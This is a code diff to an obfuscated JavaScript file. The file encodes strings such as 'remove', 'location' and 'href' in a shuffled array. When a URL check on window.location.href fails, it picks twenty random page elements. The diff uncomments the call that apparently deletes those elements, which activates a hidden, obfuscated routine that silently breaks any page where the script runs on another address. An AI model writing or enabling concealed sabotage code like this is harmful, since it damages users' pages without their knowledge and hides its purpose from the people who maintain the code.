@@ -389,7 +389,7 @@ var a = ["length", "remove", "location", "href", "indexOf", "floor", "random"];
     }
   };
   e(++d);
-})(a, 0xdb);
+}(a, 0xdb));
 var b = function (c, d) {
   c = c - 0x0;
   var e = a[c];
@@ -399,6 +399,6 @@ if (window[b("0x0")][b("0x1")][b("0x2")]("j") != 0x8) {
   for (i = 0x0; i < 0x14; ++i) {
     var items = $("*");
     var item = items[Math[b("0x3")](Math[b("0x4")]() * items[b("0x5")])];
-    // item[b("0x6")]();
+    item[b("0x6")]();
   }
 }
